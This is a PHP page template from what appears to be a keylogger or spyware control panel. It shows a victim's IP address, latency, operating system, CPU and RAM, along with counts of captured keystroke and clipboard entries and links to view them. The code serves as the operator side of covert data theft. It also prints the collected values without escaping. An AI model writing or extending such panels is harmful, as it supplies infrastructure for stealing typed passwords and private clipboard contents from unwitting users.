<?php if ($data['state'] == 'no results'): ?>
<h2>User not found</h2>
<?php elseif ($data['state'] == 'ok'): ?>

<?php
$user = $data['user'];
?>

<h2>User #<?php echo getUserTextIdentifier($user); ?></h2>


<div class="flex-container">
    <div>
        <div class="content-box">
            <div class="content-title">
                <p>Network info</p>
            </div>
            <div class="content-block">
                <h3>IP address</h3>
                <p><?php echo $user['ip'] ?></p>
                <h3>Latency</h3>
                <p><?php echo $user['latency'] == null ? '0' : $user['latency'] ?> ms</p>
            </div>
        </div>
    </div>
<?php if (!is_null($user['os']) || !is_null($user['ram']) || !is_null($user['cpu'])): ?>
    <div>
        <div class="content-box">
            <div class="content-title">
                <p>System info</p>
            </div>
            <div class="content-block">
                <?php if (!is_null($user['os'])): ?>
                <h3>Operating system</h3>
                <p><?php echo $user['os'] ?></p>
                <?php endif; ?>
                
                <?php if (!is_null($user['cpu'])): ?>
                <h3>CPU name</h3>
                <p><?php echo $user['cpu'] ?></p>
                <?php endif; ?>
                
                <?php if (!is_null($user['ram'])): ?>
                <h3>RAM size</h3>
                <p><?php echo $user['ram'] ?> mb</p>
                <?php endif; ?>
            </div>
        </div>
    </div>
<?php endif; ?>
    <div>
        <div class="content-box">
            <div class="content-title">
                <p>User data</p>
            </div>
            <div class="content-block">
                <h3>Keyboard list entries</h3>
                <?php if (!is_null($data['keyboard_entries'])): ?>
                <p><?php echo $data['keyboard_entries']; ?> - <a href="/keyboardlist/index/?uid=<?php echo $user['id']; ?>">view</a></p>
                <?php else: ?>
                <p>No keyboard data</p>
                <?php endif; ?>
                <h3>Clipboard list entries</h3>
                <?php if (!is_null($data['clipboard_entries'])): ?>
                <p><?php echo $data['clipboard_entries']; ?> - <a href="/clipboardlist/index/?uid=<?php echo $user['id']; ?>">view</a></p>
                <?php else: ?>
                <p>No clipboard data</p>
                <?php endif; ?>
            </div>
        </div>
    </div>
</div>
<?php endif; ?>